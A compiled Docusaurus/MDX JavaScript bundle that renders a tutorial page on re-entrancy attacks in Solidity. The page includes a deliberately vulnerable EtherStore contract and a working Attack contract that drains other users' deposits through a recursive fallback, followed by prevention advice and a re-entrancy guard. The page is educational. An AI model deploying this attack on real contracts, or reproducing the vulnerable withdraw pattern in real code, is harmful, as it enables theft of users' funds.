"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[3956],{3905:function(e,t,n){n.d(t,{Zo:function(){return u},kt:function(){return f}});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function c(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),s=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):c(c({},t),e)),n},u=function(e){var t=s(e.components);return r.createElement(l.Provider,{value:t},e.children)},p={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),d=s(n),f=a,h=d["".concat(l,".").concat(f)]||d[f]||p[f]||o;return n?r.createElement(h,c(c({ref:t},u),{},{components:n})):r.createElement(h,c({ref:t},u))}));function f(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,c=new Array(o);c[0]=d;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i.mdxType="string"==typeof e?e:a,c[1]=i;for(var s=2;s<o;s++)c[s]=n[s];return r.createElement.apply(null,c)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},1930:function(e,t,n){n.r(t),n.d(t,{contentTitle:function(){return l},default:function(){return d},frontMatter:function(){return i},metadata:function(){return s},toc:function(){return u}});var r=n(7462),a=n(3366),o=(n(7294),n(3905)),c=["components"],i={title:"Re-Entrancy",version:"0.8.10",description:"An example of re-entrancy attack in Solidity"},l=void 0,s={unversionedId:"Example/ReEntrancy",id:"Example/ReEntrancy",isDocsHomePage:!1,title:"Re-Entrancy",description:"An example of re-entrancy attack in Solidity",source:"@site/docs/Example/ReEntrancy.md",sourceDirName:"Example",slug:"/Example/ReEntrancy",permalink:"/rooctblog/docs/Example/ReEntrancy",tags:[],version:"current",frontMatter:{title:"Re-Entrancy",version:"0.8.10",description:"An example of re-entrancy attack in Solidity"},sidebar:"tutorialSidebar",previous:{title:"Source of Randomness",permalink:"/rooctblog/docs/Example/Randomness"},next:{title:"Self Destruct",permalink:"/rooctblog/docs/Example/SelfDestruct"}},u=[{value:"Vulnerability",id:"vulnerability",children:[]},{value:"Preventative Techniques",id:"preventative-techniques",children:[]}],p={toc:u};function d(e){var t=e.components,n=(0,a.Z)(e,c);return(0,o.kt)("wrapper",(0,r.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h3",{id:"vulnerability"},"Vulnerability"),(0,o.kt)("p",null,"Let's say that contract ",(0,o.kt)("inlineCode",{parentName:"p"},"A")," calls contract ",(0,o.kt)("inlineCode",{parentName:"p"},"B"),"."),(0,o.kt)("p",null,"Reentracy exploit allows ",(0,o.kt)("inlineCode",{parentName:"p"},"B")," to call back into ",(0,o.kt)("inlineCode",{parentName:"p"},"A")," before ",(0,o.kt)("inlineCode",{parentName:"p"},"A")," finishes execution."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\n/*\nEtherStore is a contract where you can deposit and withdraw ETH.\nThis contract is vulnerable to re-entrancy attack.\nLet\'s see why.\n\n1. Deploy EtherStore\n2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore\n3. Deploy Attack with address of EtherStore\n4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).\n   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,\n   plus 1 Ether sent from this contract).\n\nWhat happened?\nAttack was able to call EtherStore.withdraw multiple times before\nEtherStore.withdraw finished executing.\n\nHere is how the functions were called\n- Attack.attack\n- EtherStore.deposit\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack.fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n*/\n\ncontract EtherStore {\n    mapping(address => uint) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public {\n        uint bal = balances[msg.sender];\n        require(bal > 0);\n\n        (bool sent, ) = msg.sender.call{value: bal}("");\n        require(sent, "Failed to send Ether");\n\n        balances[msg.sender] = 0;\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack {\n    EtherStore public etherStore;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            etherStore.withdraw();\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether);\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw();\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n')),(0,o.kt)("h3",{id:"preventative-techniques"},"Preventative Techniques"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Ensure all state changes happen before calling external contracts"),(0,o.kt)("li",{parentName:"ul"},"Use function modifiers that prevent re-entrancy")),(0,o.kt)("p",null,"Here is a example of a re-entracy guard"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract ReEntrancyGuard {\n    bool internal locked;\n\n    modifier noReentrant() {\n        require(!locked, "No re-entrancy");\n        locked = true;\n        _;\n        locked = false;\n    }\n}\n\n')))}d.isMDXComponent=!0}}]);